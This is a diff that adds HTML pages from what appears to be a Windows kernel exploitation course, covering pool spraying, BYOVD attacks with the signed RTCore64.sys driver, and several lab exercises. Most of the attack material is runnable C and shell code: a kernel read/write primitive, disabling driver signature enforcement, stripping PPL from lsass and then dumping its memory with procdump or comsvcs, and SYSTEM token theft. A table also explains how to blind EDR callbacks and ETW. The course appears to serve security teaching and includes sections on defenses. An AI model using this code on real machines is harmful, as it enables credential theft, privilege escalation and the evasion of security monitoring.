+
+      <!-- ===================== KERNEL POOL ===================== -->
+      <h2>Windows Kernel Pool</h2>
+
+      <h3>Pool Types</h3>
+      <table class="table table-dark table-bordered">
+        <thead><tr><th>Pool Type</th><th>Executable</th><th>Pageable</th><th>Use Case</th></tr></thead>
+        <tbody>
+          <tr><td><code>NonPagedPoolNx</code></td><td>No (NX)</td><td>No (resident)</td><td>Default for kernel allocations needing DPC/ISR access</td></tr>
+          <tr><td><code>NonPagedPool</code> (legacy)</td><td>Yes (RWX!)</td><td>No</td><td>Deprecated; only for legacy drivers. Gold for exploitation.</td></tr>
+          <tr><td><code>PagedPool</code></td><td>No</td><td>Yes</td><td>Large allocations accessible only at IRQL &lt; DISPATCH_LEVEL</td></tr>
+          <tr><td><code>NonPagedPoolNxSession</code></td><td>No</td><td>No</td><td>Per-session allocations (win32k)</td></tr>
+        </tbody>
+      </table>
+
+      <h3>Pool Allocation APIs</h3>
+<pre><code class="language-c">// Modern API (Windows 10 2004+) — preferred
+PVOID ExAllocatePool2(
+    POOL_FLAGS Flags,      // POOL_FLAG_NON_PAGED, POOL_FLAG_PAGED, POOL_FLAG_NON_PAGED_EXECUTE
+    SIZE_T NumberOfBytes,
+    ULONG Tag              // 4-byte tag for tracking (e.g., 'kTaG')
+);
+
+// Legacy (do not use in new code)
+PVOID ExAllocatePoolWithTag(
+    POOL_TYPE PoolType,    // NonPagedPoolNx, PagedPool, etc.
+    SIZE_T NumberOfBytes,
+    ULONG Tag
+);
+
+// Free
+ExFreePoolWithTag(ptr, 'kTaG');</code></pre>
+
+      <h3>Pool Overflow Exploitation Patterns</h3>
+      <ol>
+        <li><strong>Adjacent object corruption:</strong> Overflow from one pool allocation into the next. If the next object has a function pointer or linked list pointers → code execution or arbitrary write.</li>
+        <li><strong>Pool header corruption:</strong> Overflow into the <code>POOL_HEADER</code> of the adjacent chunk. Modify <code>PoolType</code>, <code>PoolTag</code>, or <code>ProcessBilled</code> (quota pointer) to gain a primitive on free.</li>
+        <li><strong>Lookaside list poisoning:</strong> Corrupt lookaside free list pointer. Next allocation returns attacker-controlled address.</li>
+      </ol>
+
+      <h3>Pool Spray Techniques</h3>
+<pre><code class="language-c">// Goal: Fill pool holes so vulnerable allocation lands adjacent to target object
+
+// Spray with NtCreateEvent (creates KEVENT objects in NonPagedPoolNx)
+HANDLE events[10000];
+for (int i = 0; i < 10000; i++) {
+    NtCreateEvent(&events[i], EVENT_ALL_ACCESS, NULL, NotificationEvent, FALSE);
+}
+
+// Create holes for deterministic placement
+for (int i = 0; i < 10000; i += 2) {
+    CloseHandle(events[i]);  // Free every other allocation
+}
+
+// Trigger vulnerable allocation — lands in a hole, adjacent to KEVENT
+TriggerVulnerableIOCTL();
+
+// Pool spray with IoCompletionReserve (0x60 byte chunks in NonPagedPoolNx)
+HANDLE reserves[5000];
+for (int i = 0; i < 5000; i++) {
+    NtAllocateReserveObject(&reserves[i], NULL, MemoryReserveObjectTypeIoCompletion);
+}</code></pre>
+
+      <h3>Segment Heap in Kernel</h3>
+      <ul>
+        <li>Windows 10 20H1+ replaced the legacy pool allocator with Segment Heap</li>
+        <li>Three bucket types: LFH (Low Fragmentation Heap) for small, VS (Variable Size) for medium, Segment for large</li>
+        <li>Metadata stored separately from data (out-of-band headers) — harder to corrupt</li>
+        <li>Randomized allocation patterns in LFH buckets</li>
+        <li>Requires different spray strategies; traditional sequential adjacency less predictable</li>
+      </ul>
+
+      <!-- ===================== BYOVD ===================== -->
+      <h2>BYOVD (Bring Your Own Vulnerable Driver) Attack Pattern</h2>
+
+      <h3>Attack Flow</h3>
+      <ol>
+        <li><strong>Find a signed vulnerable driver</strong> — search LOLDrivers project, known CVEs, or audit IOCTL handlers of hardware utility drivers</li>
+        <li><strong>Obtain the driver binary</strong> — extract from vendor installer or download from public sources</li>
+        <li><strong>Load the driver</strong> — requires Administrator. Use <code>sc create</code> / <code>NtLoadDriver</code> / <code>CreateService</code></li>
+        <li><strong>Interact via IOCTLs</strong> — send crafted <code>DeviceIoControl</code> requests to exploit the vulnerability</li>
+        <li><strong>Gain kernel primitive</strong> — arbitrary read/write, MSR write, physical memory map, etc.</li>
+        <li><strong>Disable protections</strong> — patch PatchGuard, DSE, PPL, callbacks</li>
+        <li><strong>Deploy payload</strong> — load unsigned rootkit, steal credentials, etc.</li>
+      </ol>
+
+<pre><code class="language-c">// Example: Loading a vulnerable driver and exploiting arbitrary R/W
+#include &lt;windows.h&gt;
+
+// Load the signed vulnerable driver
+SC_HANDLE hSCManager = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
+SC_HANDLE hService = CreateService(hSCManager, "VulnDrv", "Vulnerable Driver",
+    SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
+    SERVICE_ERROR_IGNORE, "C:\\path\\to\\RTCore64.sys", NULL, NULL, NULL, NULL, NULL);
+StartService(hService, 0, NULL);
+
+// Open device handle
+HANDLE hDevice = CreateFile("\\\\.\\RTCore64", GENERIC_READ | GENERIC_WRITE,
+    0, NULL, OPEN_EXISTING, 0, NULL);
+
+// RTCore64.sys arbitrary read IOCTL structure
+typedef struct {
+    BYTE  Padding1[8];
+    DWORD64 Address;        // Target kernel address to read
+    BYTE  Padding2[8];
+    DWORD Size;             // Bytes to read (4 or 8)
+    DWORD Value;            // Output value (for 4-byte read)
+    BYTE  Padding3[16];
+} RTCORE_READ;
+
+RTCORE_READ readReq = {0};
+readReq.Address = target_kernel_address;
+readReq.Size = 4;
+DeviceIoControl(hDevice, 0x80002048, &readReq, sizeof(readReq), &readReq, sizeof(readReq), &bytesReturned, NULL);
+// readReq.Value now contains kernel memory content</code></pre>
+
+      <h3>Disabling Protections via BYOVD</h3>
+      <table class="table table-dark table-bordered">
+        <thead><tr><th>Target</th><th>Method</th></tr></thead>
+        <tbody>
+          <tr><td>DSE (Driver Signature Enforcement)</td><td>Write 0x0 to <code>ci!g_CiOptions</code> → load any unsigned driver</td></tr>
+          <tr><td>PatchGuard</td><td>Locate PG timer DPC context, corrupt/disable timer or verification routine</td></tr>
+          <tr><td>PPL (Protected Process Light)</td><td>Modify <code>EPROCESS.Protection</code> byte (SignatureLevel/SectionSignatureLevel) or zero <code>PS_PROTECTION</code></td></tr>
+          <tr><td>ETW Threat Intelligence</td><td>Patch <code>EtwThreatIntProvRegHandle</code> to disable EDR telemetry</td></tr>
+          <tr><td>Kernel callbacks</td><td>Remove process/thread/image notification callbacks from callback arrays</td></tr>
+          <tr><td>Object callbacks (ObRegisterCallbacks)</td><td>Unlink callback entries from kernel lists</td></tr>
+          <tr><td>Minifilter callbacks</td><td>Modify FLT_INSTANCE callback tables to blind filesystem monitoring</td></tr>
+        </tbody>
+      </table>
+
+      <h3>Known Attack Tools</h3>
+      <table class="table table-dark table-bordered">
+        <thead><tr><th>Tool</th><th>Purpose</th><th>Driver Used</th></tr></thead>
+        <tbody>
+          <tr><td><strong>KDU</strong> (Kernel Driver Utility)</td><td>Map unsigned drivers into kernel using vulnerable signed driver as proxy</td><td>Multiple (configurable provider list)</td></tr>
+          <tr><td><strong>PPLKiller</strong></td><td>Remove PPL protection from any process (dump lsass from PPL)</td><td>RTCore64.sys (MSI Afterburner)</td></tr>
+          <tr><td><strong>PPLFault / PPLDump</strong></td><td>Dump PPL process memory using code page ROP without a vulnerable driver</td><td>None (abuses LSASS code pages)</td></tr>
+          <tr><td><strong>EDRSandBlast</strong></td><td>Disable EDR kernel callbacks, ETW providers, minifilters</td><td>Multiple vulnerable drivers</td></tr>
+          <tr><td><strong>Backstab</strong></td><td>Kill EDR protected processes</td><td>PROCEXP152.sys (Process Explorer)</td></tr>
+          <tr><td><strong>AuKill</strong></td><td>Disable Windows Defender/EDR services via process termination</td><td>PROCEXP152.sys</td></tr>
+        </tbody>
+      </table>
+
+      <h3>Defenses Against BYOVD</h3>
+      <ul>
+        <li><strong>HVCI:</strong> Even with arbitrary write, cannot execute unsigned shellcode in kernel (NX enforced by hypervisor)</li>
+        <li><strong>Microsoft Vulnerable Driver Blocklist:</strong> Updated list of known vulnerable driver hashes; enforced by HVCI or WDAC. Enable via:
+<pre><code class="language-powershell"># Check if blocklist is active
+Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard | 
+  Select-Object -ExpandProperty CodeIntegrityPolicyEnforcementStatus
+
+# WDAC policy to block known vulnerable drivers (applied via GPO or Intune)
+# Blocklist XML: https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/design/microsoft-recommended-driver-block-rules</code></pre>
+        </li>
+        <li><strong>WDAC (Windows Defender Application Control):</strong> Whitelist-only policy for kernel drivers</li>
+        <li><strong>ASR rules:</strong> Block loading of drivers by untrusted processes</li>
+        <li><strong>Driver load auditing:</strong> Event ID 7045 (Service Created), Sysmon Event ID 6 (Driver Loaded)</li>
+      </ul>
+
+    </div>
+
+    <!-- ============================================================ -->
+    <!-- LABS TAB -->
+    <!-- ============================================================ -->
+    <div class="tab-pane fade" id="lab" role="tabpanel" aria-labelledby="lab-tab">
+
+      <h2>Labs</h2>
+
+      <!-- LAB 1 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h5>Lab 1: Enumerating Kernel Security Features</h5></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Determine the active kernel security features on a Windows system.</p>
+          <p><strong>Environment:</strong> Windows 10/11 VM (any edition)</p>
+          <h6>Steps:</h6>
+          <ol>
+            <li>Check VBS and HVCI status:</li>
+          </ol>
+<pre><code class="language-powershell"># Full Device Guard status
+$dg = Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
+$dg | Format-List *
+
+# Interpret VirtualizationBasedSecurityStatus
+switch ($dg.VirtualizationBasedSecurityStatus) {
+    0 { "VBS: Not enabled" }
+    1 { "VBS: Enabled but not running" }
+    2 { "VBS: Running" }
+}
+
+# Check which security services are running in VTL 1
+$dg.SecurityServicesRunning | ForEach-Object {
+    switch ($_) { 1 {"Credential Guard"}; 2 {"HVCI"}; 3 {"System Guard Secure Launch"}; 4 {"SMM Firmware Measurement"} }
+}
+
+# Check Secure Boot
+Confirm-SecureBootUEFI
+
+# Check kernel mitigations
+Get-ItemProperty -Path "HKLM:\SYSTEM\CurrentControlSet\Control\Session Manager\kernel" -Name "MitigationAuditOptions*","MitigationOptions*" -ErrorAction SilentlyContinue
+
+# Check KASLR entropy (boot config)
+bcdedit /enum | Select-String "highentropyva|nx|relocatephysical"
+
+# Check DSE state via CI options
+# (requires kernel debugger or driver for actual g_CiOptions read)
+reg query "HKLM\SYSTEM\CurrentControlSet\Control\CI" /v "Protected"
+
+# SMEP/SMAP - check CPU features
+(Get-WmiObject Win32_Processor).Caption
+# Verify in debugger: .formats cr4 → check bits 20 (SMEP) and 21 (SMAP)</code></pre>
+          <ol start="2">
+            <li>Document all findings in a security assessment report format.</li>
+            <li>Compare results between a VM with VBS enabled vs disabled.</li>
+          </ol>
+          <p><strong>Expected Outcome:</strong> Understand which protections are active and their interdependencies.</p>
+        </div>
+      </div>
+
+      <!-- LAB 2 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h5>Lab 2: KASLR Information Leak via NtQuerySystemInformation</h5></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Leak kernel module base addresses to defeat KASLR.</p>
+          <p><strong>Environment:</strong> Windows 10 1809 VM (older build for unrestricted access), Visual Studio</p>
+          <h6>Steps:</h6>
+<pre><code class="language-c">#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;winternl.h&gt;
+
+#pragma comment(lib, "ntdll.lib")
+
+#define SystemModuleInformation 11
+#define SystemBigPoolInformation 0x42
+#define SystemHandleInformation 16
+
+typedef struct _RTL_PROCESS_MODULE_INFORMATION {
+    HANDLE Section;
+    PVOID MappedBase;
+    PVOID ImageBase;
+    ULONG ImageSize;
+    ULONG Flags;
+    USHORT LoadOrderIndex;
+    USHORT InitOrderIndex;
+    USHORT LoadCount;
+    USHORT OffsetToFileName;
+    UCHAR FullPathName[256];
+} RTL_PROCESS_MODULE_INFORMATION, *PRTL_PROCESS_MODULE_INFORMATION;
+
+typedef struct _RTL_PROCESS_MODULES {
+    ULONG NumberOfModules;
+    RTL_PROCESS_MODULE_INFORMATION Modules[1];
+} RTL_PROCESS_MODULES, *PRTL_PROCESS_MODULES;
+
+int main() {
+    NTSTATUS status;
+    ULONG retLen = 0;
+    
+    // Query required buffer size
+    NtQuerySystemInformation(SystemModuleInformation, NULL, 0, &retLen);
+    
+    PRTL_PROCESS_MODULES pMods = (PRTL_PROCESS_MODULES)malloc(retLen);
+    status = NtQuerySystemInformation(SystemModuleInformation, pMods, retLen, &retLen);
+    
+    if (NT_SUCCESS(status)) {
+        printf("[+] Leaked %lu kernel module addresses:\n\n", pMods->NumberOfModules);
+        for (ULONG i = 0; i < pMods->NumberOfModules && i < 20; i++) {
+            printf("  [%02lu] Base: 0x%p  Size: 0x%08X  %s\n",
+                i,
+                pMods->Modules[i].ImageBase,
+                pMods->Modules[i].ImageSize,
+                pMods->Modules[i].FullPathName + pMods->Modules[i].OffsetToFileName);
+        }
+        printf("\n[+] ntoskrnl.exe base: 0x%p\n", pMods->Modules[0].ImageBase);
+    } else {
+        printf("[-] NtQuerySystemInformation failed: 0x%08X\n", status);
+        printf("    (May require elevation on modern Windows builds)\n");
+    }
+    
+    free(pMods);
+    return 0;
+}</code></pre>
+          <ol>
+            <li>Compile and run as non-admin on Windows 10 1809. Note successful leak.</li>
+            <li>Try the same on Windows 11 23H2 — observe access denied without elevation.</li>
+            <li>Research: Which build introduced the Medium IL restriction?</li>
+          </ol>
+          <p><strong>Expected Outcome:</strong> Understand how KASLR leaks work and how they've been mitigated over time.</p>
+        </div>
+      </div>
+
+      <!-- LAB 3 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h5>Lab 3: Pool Spray and Overflow Simulation</h5></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Practice kernel pool spray techniques using a vulnerable driver (HEVD).</p>
+          <p><strong>Environment:</strong> Windows 10 x64 VM, <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver">HackSys Extreme Vulnerable Driver (HEVD)</a>, WinDbg</p>
+          <h6>Steps:</h6>
+          <ol>
+            <li>Install HEVD driver (test-signing mode required):</li>
+          </ol>
+<pre><code class="language-powershell"># Enable test signing
+bcdedit /set testsigning on
+# Reboot, then load HEVD
+sc create HEVD type= kernel binPath= "C:\HEVD\HEVD.sys"
+sc start HEVD</code></pre>
+          <ol start="2">
+            <li>Write pool spray exploit for HEVD's pool overflow vulnerability:</li>
+          </ol>
+<pre><code class="language-c">#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+#define HEVD_DEVICE "\\\\.\\HackSysExtremeVulnerableDriver"
+#define IOCTL_POOL_OVERFLOW 0x22200F
+
+// Pool spray: create objects of target size (0x200 bytes for this vuln)
+// Using Event objects which are ~0x40 bytes in NonPagedPoolNx
+// For 0x200 size class, use IoCompletionReserve objects
+
+typedef NTSTATUS(NTAPI* pNtAllocateReserveObject)(PHANDLE, POBJECT_ATTRIBUTES, DWORD);
+
+int main() {
+    HANDLE hDevice = CreateFileA(HEVD_DEVICE, GENERIC_READ | GENERIC_WRITE,
+        0, NULL, OPEN_EXISTING, 0, NULL);
+    
+    if (hDevice == INVALID_HANDLE_VALUE) {
+        printf("[-] Cannot open HEVD device\n");
+        return 1;
+    }
+    
+    // Load NtAllocateReserveObject
+    pNtAllocateReserveObject NtAllocateReserveObject = 
+        (pNtAllocateReserveObject)GetProcAddress(GetModuleHandle("ntdll"), "NtAllocateReserveObject");
+    
+    printf("[*] Spraying pool with IoCompletionReserve objects...\n");
+    HANDLE spray[10000];
+    for (int i = 0; i < 10000; i++) {
+        NtAllocateReserveObject(&spray[i], NULL, 1); // IoCompletion type
+    }
+    
+    printf("[*] Creating holes...\n");
+    for (int i = 0; i < 10000; i += 16) {
+        for (int j = 0; j < 8; j++) {
+            CloseHandle(spray[i + j]);
+            spray[i + j] = NULL;
+        }
+    }
+    
+    printf("[*] Triggering pool overflow...\n");
+    // Overflow buffer — overwrites adjacent pool chunk header + data
+    BYTE overflow_buf[0x200 + 0x50]; // overflow into next chunk
+    memset(overflow_buf, 'A', sizeof(overflow_buf));
+    // Craft fake OBJECT_HEADER or callback pointer at correct offset...
+    
+    DWORD bytesReturned;
+    DeviceIoControl(hDevice, IOCTL_POOL_OVERFLOW, overflow_buf, sizeof(overflow_buf),
+        NULL, 0, &bytesReturned, NULL);
+    
+    printf("[+] Overflow triggered. Check WinDbg for pool corruption.\n");
+    
+    CloseHandle(hDevice);
+    return 0;
+}</code></pre>
+          <ol start="3">
+            <li>In WinDbg, set breakpoints and observe pool layout:</li>
+          </ol>
+<pre><code class="language-bash"># WinDbg commands
+!pool [address]        # Examine pool chunk
+!poolused 2           # Pool usage by tag
+!poolfind [tag]       # Find allocations by tag
+dt nt!_POOL_HEADER [address]
+bp HEVD!TriggerPoolOverflow</code></pre>
+          <p><strong>Expected Outcome:</strong> Achieve deterministic adjacent allocation placement and understand pool metadata corruption.</p>
+        </div>
+      </div>
+
+      <!-- LAB 4 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h5>Lab 4: BYOVD — Loading and Exploiting RTCore64.sys</h5></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Use a legitimately signed vulnerable driver to achieve kernel read/write.</p>
+          <p><strong>Environment:</strong> Windows 10/11 VM (HVCI DISABLED), Administrator access, RTCore64.sys</p>
+          <h6>Steps:</h6>
+<pre><code class="language-c">#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+
+#define RTCORE_DEVICE "\\\\.\\RTCore64"
+#define RTCORE_READ_IOCTL  0x80002048
+#define RTCORE_WRITE_IOCTL 0x8000204C
+
+#pragma pack(push, 1)
+typedef struct _RTCORE_MEMORY {
+    BYTE     Pad0[8];
+    DWORD64  Address;
+    BYTE     Pad1[8];
+    DWORD    ReadSize;
+    DWORD    Value;
+    BYTE     Pad2[16];
+} RTCORE_MEMORY;
+#pragma pack(pop)
+
+HANDLE g_hDevice = INVALID_HANDLE_VALUE;
+
+BOOL LoadVulnDriver() {
+    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
+    SC_HANDLE hSvc = CreateServiceA(hSCM, "RTCore64", "Micro-Star MSI Afterburner",
+        SERVICE_ALL_ACCESS, SERVICE_KERNEL_DRIVER, SERVICE_DEMAND_START,
+        SERVICE_ERROR_IGNORE, "C:\\Tools\\RTCore64.sys", NULL, NULL, NULL, NULL, NULL);
+    
+    if (!hSvc) hSvc = OpenServiceA(hSCM, "RTCore64", SERVICE_ALL_ACCESS);
+    StartService(hSvc, 0, NULL);
+    
+    g_hDevice = CreateFileA(RTCORE_DEVICE, GENERIC_READ | GENERIC_WRITE,
+        0, NULL, OPEN_EXISTING, 0, NULL);
+    
+    CloseServiceHandle(hSvc);
+    CloseServiceHandle(hSCM);
+    return (g_hDevice != INVALID_HANDLE_VALUE);
+}
+
+DWORD KernelRead32(DWORD64 address) {
+    RTCORE_MEMORY mem = {0};
+    mem.Address = address;
+    mem.ReadSize = 4;
+    DWORD bytes;
+    DeviceIoControl(g_hDevice, RTCORE_READ_IOCTL, &mem, sizeof(mem), &mem, sizeof(mem), &bytes, NULL);
+    return mem.Value;
+}
+
+void KernelWrite32(DWORD64 address, DWORD value) {
+    RTCORE_MEMORY mem = {0};
+    mem.Address = address;
+    mem.ReadSize = 4;
+    mem.Value = value;
+    DWORD bytes;
+    DeviceIoControl(g_hDevice, RTCORE_WRITE_IOCTL, &mem, sizeof(mem), &mem, sizeof(mem), &bytes, NULL);
+}
+
+int main() {
+    if (!LoadVulnDriver()) {
+        printf("[-] Failed to load RTCore64.sys\n");
+        return 1;
+    }
+    printf("[+] RTCore64.sys loaded, device handle obtained\n");
+    
+    // Example: Read ntoskrnl base (use KASLR leak first)
+    // Then read g_CiOptions to check DSE state
+    // DWORD ciOptions = KernelRead32(ci_g_CiOptions_address);
+    // printf("[+] Current g_CiOptions: 0x%X\n", ciOptions);
+    
+    // Disable DSE:
+    // KernelWrite32(ci_g_CiOptions_address, 0x0);
+    
+    printf("[+] Lab complete. Kernel R/W primitive established.\n");
+    CloseHandle(g_hDevice);
+    return 0;
+}</code></pre>
+          <p><strong>Tasks:</strong></p>
+          <ol>
+            <li>Load RTCore64.sys and verify device handle</li>
+            <li>Read the first 4 bytes of ntoskrnl.exe to verify read works (should be "MZ" = 0x5A4D)</li>
+            <li>Locate and read <code>ci!g_CiOptions</code></li>
+            <li>Disable DSE and load a custom unsigned test driver</li>
+            <li>Re-enable DSE and clean up</li>
+          </ol>
+          <p><strong>SAFETY:</strong> Do this ONLY in a disposable VM. BYOVD tools may flag AV/EDR.</p>
+        </div>
+      </div>
+
+      <!-- LAB 5 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h5>Lab 5: Disabling PPL (Protected Process Light) via Kernel Write</h5></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Remove PPL protection from lsass.exe to allow credential dumping.</p>
+          <p><strong>Environment:</strong> Windows 10/11 VM (PPL enabled for LSASS), kernel R/W primitive from Lab 4</p>
+          <h6>Steps:</h6>
+<pre><code class="language-c">// EPROCESS.Protection offset varies by build
+// Use: dt nt!_EPROCESS Protection in WinDbg to find offset
+// Windows 10 22H2: offset ~0x87A (verify in your build!)
+
+// PS_PROTECTION structure (1 byte):
+// Bits [2:0] = Type (0=None, 1=ProtectedLight, 2=Protected)
+// Bits [6:3] = Signer (PsProtectedSignerNone=0, PsProtectedSignerAuthenticode=1,
+//              PsProtectedSignerCodeGen=2, PsProtectedSignerAntimalware=3,
+//              PsProtectedSignerLsa=4, PsProtectedSignerWindows=5,
+//              PsProtectedSignerWinTcb=6, PsProtectedSignerWinSystem=7)
+
+#include &lt;windows.h&gt;
+#include &lt;stdio.h&gt;
+#include &lt;tlhelp32.h&gt;
+
+// Assume kernel R/W primitives from Lab 4
+extern DWORD KernelRead32(DWORD64 address);
+extern void KernelWrite32(DWORD64 address, DWORD value);
+
+DWORD64 GetEPROCESS(DWORD pid) {
+    // Walk ActiveProcessLinks from System (PID 4) EPROCESS
+    // Or use PsLookupProcessByProcessId if you have a loaded driver
+    // For this lab, use NtQuerySystemInformation + SystemHandleInformation 
+    // to find EPROCESS from object pointer
+    // ... (implementation depends on KASLR leak technique used)
+    return 0; // placeholder
+}
+
+int main() {
+    DWORD lsassPid = 0;
+    
+    // Find lsass.exe PID
+    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    PROCESSENTRY32 pe = { sizeof(pe) };
+    Process32First(hSnap, &pe);
+    do {
+        if (_stricmp(pe.szExeFile, "lsass.exe") == 0) {
+            lsassPid = pe.th32ProcessID;
+            break;
+        }
+    } while (Process32Next(hSnap, &pe));
+    CloseHandle(hSnap);
+    
+    printf("[+] lsass.exe PID: %lu\n", lsassPid);
+    
+    // Get EPROCESS address for lsass
+    DWORD64 lsassEprocess = GetEPROCESS(lsassPid);
+    printf("[+] EPROCESS: 0x%llX\n", lsassEprocess);
+    
+    // Read current Protection value
+    DWORD64 protectionOffset = 0x87A; // VERIFY for your build!
+    DWORD protection = KernelRead32(lsassEprocess + protectionOffset) & 0xFF;
+    printf("[+] Current Protection: 0x%02X (Type=%d, Signer=%d)\n", 
+        protection, protection & 0x7, (protection >> 3) & 0xF);
+    
+    // Zero out protection
+    // Write byte: need to read DWORD, mask, write back
+    DWORD currentDword = KernelRead32(lsassEprocess + protectionOffset);
+    DWORD newDword = currentDword & 0xFFFFFF00; // Zero the Protection byte
+    KernelWrite32(lsassEprocess + protectionOffset, newDword);
+    
+    printf("[+] PPL Protection removed! lsass.exe is now unprotected.\n");
+    printf("[*] You can now use MiniDumpWriteDump or comsvcs.dll to dump lsass.\n");
+    
+    return 0;
+}</code></pre>
+          <p><strong>Verification:</strong> After removing PPL, dump lsass with <code>procdump -ma lsass.exe lsass.dmp</code> or <code>rundll32 comsvcs.dll MiniDump [pid] out.dmp full</code></p>
+        </div>
+      </div>
+
+      <!-- LAB 6 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h5>Lab 6: Token Privilege Escalation via Kernel Object Manipulation</h5></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Elevate current process to SYSTEM by stealing SYSTEM token.</p>
+          <p><strong>Environment:</strong> Windows 10 VM, HEVD or other kernel write primitive, WinDbg</p>
+<pre><code class="language-c">// Token stealing shellcode concept (x64)
+// 1. Find current EPROCESS (from KTHREAD → EPROCESS)
+// 2. Walk ActiveProcessLinks to find System (PID 4) EPROCESS
+// 3. Copy System's Token to current process EPROCESS
+
+// Using R/W primitive approach (no shellcode execution needed):
+void StealSystemToken(DWORD64 currentEprocess, DWORD64 systemEprocess) {
+    // TOKEN offset in EPROCESS (Win10 22H2): ~0x4B8
+    DWORD64 tokenOffset = 0x4B8; // VERIFY!
+    
+    // Token is stored as EX_FAST_REF: pointer with low 4 bits as ref count
+    DWORD64 systemToken = KernelRead64(systemEprocess + tokenOffset);
+    systemToken &= ~0xFULL; // Clear ref count bits
+    
+    // Read current token for restoration later
+    DWORD64 oldToken = KernelRead64(currentEprocess + tokenOffset);
+    printf("[*] Old token: 0x%llX\n", oldToken);
+    
+    // Overwrite with System token (add ref count of 0xF)
+    KernelWrite64(currentEprocess + tokenOffset, systemToken | 0xF);
+    printf("[+] Token replaced with SYSTEM token: 0x%llX\n", systemToken);
+    
+    // Verify: spawn cmd.exe — should be SYSTEM
+    system("whoami"); // Should print "nt authority\system"
+    system("cmd.exe");
+}
+
+// Alternative: Modify token privileges directly
+void EnableAllPrivileges(DWORD64 tokenAddress) {
+    // TOKEN.Privileges offset: dt nt!_TOKEN Privileges
+    // _SEP_TOKEN_PRIVILEGES: Present, Enabled, EnabledByDefault (each ULONG64)
+    DWORD64 privOffset = 0x40; // Offset to Privileges within TOKEN (VERIFY!)
+    
+    // Set all privilege bits
+    DWORD64 allPrivs = 0xFFFFFFFFFFFFFFFF;
+    KernelWrite64(tokenAddress + privOffset,     allPrivs); // Present
+    KernelWrite64(tokenAddress + privOffset + 8, allPrivs); // Enabled
+    KernelWrite64(tokenAddress + privOffset + 16, allPrivs); // EnabledByDefault
+}</code></pre>
+          <p><strong>WinDbg Verification:</strong></p>
+<pre><code class="language-bash">!process 0 0 lsass.exe
+dt nt!_EPROCESS Token [eprocess_addr]
+!token [token_addr]
+dt nt!_SEP_TOKEN_PRIVILEGES [token_addr+privs_offset]</code></pre>
+        </div>
+      </div>
+
+      <!-- LAB 7 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h5>Lab 7: Detecting and Analyzing PatchGuard (KPP)</h5></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Observe PatchGuard in action by triggering a CRITICAL_STRUCTURE_CORRUPTION bugcheck.</p>
+          <p><strong>Environment:</strong> Windows 10 VM with kernel debugger attached (WinDbg over named pipe/network)</p>
+          <h6>Steps:</h6>
+          <ol>
+            <li>Configure kernel debugging:</li>
+          </ol>
+<pre><code class="language-powershell"># On target VM
+bcdedit /debug on
+bcdedit /dbgsettings net hostip:192.168.1.100 port:50000
+# Reboot</code></pre>
+          <ol start="2">
+            <li>In WinDbg, hook an SSDT entry (this will trigger PatchGuard):</li>
+          </ol>
+<pre><code class="language-bash"># In WinDbg (break into debugger with Ctrl+Break)
+# Find KeServiceDescriptorTable
+x nt!KeServiceDescriptorTable
+# Read current NtCreateFile pointer
+dps nt!KiServiceTable L1
+# Modify it (THIS WILL TRIGGER PATCHGUARD)
+eq nt!KiServiceTable deadbeefdeadbeef
+# Resume execution
+g
+# Wait 5-10 minutes... BSOD with 0x109!</code></pre>
+          <ol start="3">
+            <li>Analyze the bugcheck:</li>
+          </ol>
+<pre><code class="language-bash"># After BSOD, in crash dump analysis:
+!analyze -v
+# BugCheck 109 = CRITICAL_STRUCTURE_CORRUPTION
+# Parameter 1: Identification of the corrupted region
+# Parameter 2: Type of corruption
+# Parameter 3: Modified value
+# Parameter 4: Expected value</code></pre>
+          <ol start="4">
+            <li>Observe PatchGuard timers (research — do NOT disrupt on production systems):</li>
+          </ol>
+<pre><code class="language-bash"># List DPC timers (some are PatchGuard's)
+!timer
+# PatchGuard timers have randomized DeferredRoutine addresses
+# They point into ntoskrnl.exe obfuscated code regions</code></pre>
+          <p><strong>Expected Outcome:</strong> Understand PatchGuard detection timing and the information available in the bugcheck for forensics.</p>
+        </div>
+      </div>
+
+      <!-- LAB 8 -->
+      <div class="card bg-dark text-light mb-3">
+        <div class="card-header"><h5>Lab 8: Secure Boot Key Analysis and Attack Surface</h5></div>
+        <div class="card-body">
+          <p><strong>Objective:</strong> Extract and analyze Secure Boot certificates and understand the trust chain.</p>
+          <p><strong>Environment:</strong> Windows 10/11 VM with UEFI Secure Boot</p>
+<pre><code class="language-powershell"># Export Secure Boot variables
+$pk = Get-SecureBootUEFI -Name PK
+$kek = Get-SecureBootUEFI -Name KEK
+$db = Get-SecureBootUEFI -Name db
+$dbx = Get-SecureBootUEFI -Name dbx
+
+# Save to files for analysis
+[System.IO.File]::WriteAllBytes("C:\SecureBoot\PK.bin", $pk.Bytes)
+[System.IO.File]::WriteAllBytes("C:\SecureBoot\KEK.bin", $kek.Bytes)
+[System.IO.File]::WriteAllBytes("C:\SecureBoot\db.bin", $db.Bytes)
+[System.IO.File]::WriteAllBytes("C:\SecureBoot\dbx.bin", $dbx.Bytes)
+
+# Parse certificates from db using PowerShell
